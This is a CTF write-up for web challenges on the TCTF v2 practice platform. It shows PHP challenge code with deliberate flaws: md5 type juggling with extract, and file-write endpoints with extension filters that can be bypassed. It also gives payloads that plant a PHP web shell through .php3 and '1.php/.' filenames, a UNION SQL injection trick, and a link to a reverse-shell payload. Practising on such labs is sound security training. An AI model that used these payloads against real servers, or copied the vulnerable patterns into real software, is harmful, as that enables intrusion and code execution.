# TCTF v2 
TCTF v2 is the CTF practice platform for MasonCC, and I have put up some web challenge on it. It is pity that I cannot keep all challenges running on server. Therefore, I would give my writeup of web challenge here. Welcome to take source code of challenges if you are interested in anyone.  
*  [Cover Peasy](#cover-peasy)  
*  [PHP un-Siri ME](#php-un-siri-me)  
*  [Unicorn && Lion](#unicorn-and-lion)  
*  [Shorter shell](#shorter-shell)  
*  [Peasy shell not PHP](#peasy-shell-not-php)  
*  [Apache2 giv u new Shell](#apache2-giv-u-new-shell)  
*  [Destroy chllenge with ur shell?](#destroy-chllenge-with-ur-shell)  

## Cover Peasy
Level: :star:  
see source code in ./easypeasy.txt  
```php
<meta charset="utf-8">
<?php

error_reporting(0);
if (empty($_GET['str'])) {
    echo "see source code in ./easypeasy.txt";
    die();
}else{
    $flag = trim(file_get_contents('xxxxxxxxxxx.php'));
    $url = "www.1pwnch.org";
    $str = $_GET['str'];
    $pwnch = "enjoyIt";
    @parse_str($str);
    if ($url[0] != 'QNKCDZO' && md5($url[0]) == md5('QNKCDZO')) {
        extract($_GET);
        if($pwnch == $flag){
            echo "masoncc{xxxxxxxxxxx}";
        }else{
            echo "Good! But it's not enough!";
        }
    }else{
        exit('Try angain :-)');
    }
}
?>
```

## PHP un Siri ME
Level: :star::star:  
The difficulty of this challenge is your truely understand of unserialization.  

## Unicorn and Lion
Level: :star:  
This is a very classic challenge for Union-based mysql injection.  
I won't keep source code of file in this place.  
You need to find each answer of problem from the **faq.php**.  
What's worth paying attention to is that you need to separate each results of answer.  
Here is the trick ```group_concat(column name separator 'x')```  
that ```x``` can help you separate each results.  
![union](https://github.com/shinmao/CTF-writeups/blob/master/tctf-masoncc-writeup/screenshot/union%20and%20lion.png)

## Shorter shell
Level: :star::star::star:  
[Enjoy my writeup on my blog](https://shinmao.github.io/2018/02/20/A-tiny-shell/)  
In fact, there is a classic solution to such kind of challenge: **Reverse shell**  
Thanks to @chris-issing provides his [payload](https://github.com/shinmao/CTF-writeups/blob/master/tctf-masoncc-writeup/shorter-shell-others/chriss-issing.rb) 

## Peasy shell not PHP
Level: :star:  
```php
show_source(__FILE__);

$content = $_POST['content'];
$filename = $_POST['filename'];
$filename = "backup/".$filename;

if(preg_match('/.+\.php$/i', $filename)){
    echo 'Hey! I have told you, bad boy!';
}else{
    $f = fopen($filename,'w');
    fwrite($f, $content);
    fclose($f);
}
```
Payload: ```url/?content=<?php system('ls');?>&filename=1.php3```  
Associated knowledge: ```.php4```,```php5```,```php7```,```pht```,```phtml``` can also work.  

## Apache2 giv u new Shell
Level: :star:  
```php 
show_source(__FILE__); 

$sandbox = 'sb'.md5($_SERVER['REMOTE_ADDR']);
echo 'Here is your sandbox: '.$sandbox;

@mkdir($sandbox);
@chdir($sandbox);
@exec('touch i_no_you.txt');
 
$content = $_POST['content']; 
$filename = $_POST['filename']; 
 
if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
   die("1pwnch is angry!!");
}else{
    $f = fopen($filename, 'w');
    fwrite($f, $content);
    fclose($f);
}
```
Payload: ```url/?content=<?php system('ls');?>&filename=1.php/.```  

## Destroy chllenge with ur shell
Level: :star::star::star:  
```php
// up.php
show_source(__FILE__);
function ppwaf($file){
    $hack = file_get_contents($file);
    if(stripos($hack,'eval') === false && stripos($hack,'assert') === false && stripos($hack,'echo') === false){
        echo "good! The content of your file is secure!"."<br />";
        return true;
    }else{
        echo "You have dangerous content!"."<br />";
        return false;
    }
}

function ppname($name){
    if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $name)){
           echo "Bad file extension";
        return false;
    }else{
            return true;
        echo "good! The filename of your file is secure!"."<br />";
    }
}

if($_FILES["file"]["error"]>0){
    echo "error code: ".$_FILES["file"]["error"]."<br />";
}else{
    echo "filename: ".$_FILES["file"]["name"]."<br />";
    echo "tmp name: ".$_FILES["file"]["tmp_name"]."<br />";
    if(ppwaf($_FILES["file"]["tmp_name"]) == true && ppname($_GET['name']) == true){
            move_uploaded_file($_FILES["file"]["tmp_name"],$_GET['name']);
    }else{
        echo "I am sorry because your dangerous file!"."<br />";
    }
}
```
Payload: [Enjoy my blog](https://shinmao.github.io/web/2018/04/13/The-Magic-from-0CTF-ezDoor/)  
![payload](https://github.com/shinmao/shinmao.github.io/blob/master/assets/uploads/2018-04-13/payload.png)
